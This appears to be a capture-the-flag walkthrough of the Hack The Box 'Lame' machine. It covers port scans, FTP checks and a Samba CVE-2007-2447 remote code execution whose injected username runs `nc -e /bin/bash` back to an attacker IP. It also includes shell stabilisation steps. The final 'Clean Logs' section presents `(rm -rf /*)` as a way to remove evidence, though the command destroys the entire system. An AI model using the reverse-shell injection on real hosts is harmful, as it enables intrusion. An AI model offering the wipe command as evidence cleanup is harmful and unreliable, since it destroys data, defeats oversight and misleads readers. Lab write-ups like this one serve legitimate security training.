# HTB - Lame

**IP Address:** `10.10.10.3`  
**OS:** Linux  
**Difficulty:** Easy  
**Tags:** FTP, Samba, RCE, Netcat, CVE-2007-2447, Shell Stabilization

---

## 1. Network Scan

### 1.1 Ping Check

```bash
ping -c 1 10.10.10.3
```

✅ Host is alive

### 1.2 Full Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
```

Discovered:

- 21/tcp → FTP (vsftpd 2.3.4)
- 22/tcp → SSH
- 139/tcp → NetBIOS
- 445/tcp → Microsoft-DS (Samba)
- 3632/tcp → distccd

### 1.3 Targeted Version Scan

```bash
nmap -sC -sV -p21,22,139,445,3632 10.10.10.3 -oN targeted
```

---

## 2. FTP Enumeration

```bash
ftp 10.10.10.3
```

✅ Anonymous login allowed  
❌ No useful files to download

### 2.1 FTP Exploit (vsftpd 2.3.4)

Checked `vsftpd 2.3.4` in `searchsploit`:

```bash
searchsploit vsftpd 2.3.4
```

Downloaded and tested exploit:

```bash
searchsploit -m 49757
```

❌ Exploit ran but no shell was obtained.

---

## 3. Samba RCE - CVE-2007-2447

Targeted Samba 3.0.20 with this exploit:

```bash
https://github.com/MikeRega7/CVE-2007-2447-RCE
```

Confirmed shares:

```bash
smbclient -L 10.10.10.3 -N
```

Connected to `/tmp` share:

```bash
smbclient //10.10.10.3/tmp -N
```

Exploit uses:

```bash
username = "/=`nohup nc -e /bin/bash 10.10.14.4 443`"
```

Set up listener:

```bash
nc -lvnp 443
```

Received reverse shell!

---

## 4. Shell Stabilization

On the victim shell:

```bash
script /dev/null -c bash
```

Then:

```bash
[CTRL+Z]
stty raw -echo; fg
reset xterm
```

Now, you can use interactive commands like `clear`, `Ctrl+C`, etc.

---

## 5. Flags

### 5.1 User Flag

Located in home directory  
🏁 **User flag retrieved**

### 5.2 Root Flag

Checked `/root`  
🏁 **Root flag retrieved**

---

## ✅ Post Exploitation - Clean Logs (Optional)

To remove evidence:

```bash
(rm -rf /*) 2>/dev/null
```

⚠️ **Use with caution** — this wipes the system.

---

# ✅ MACHINE COMPLETE
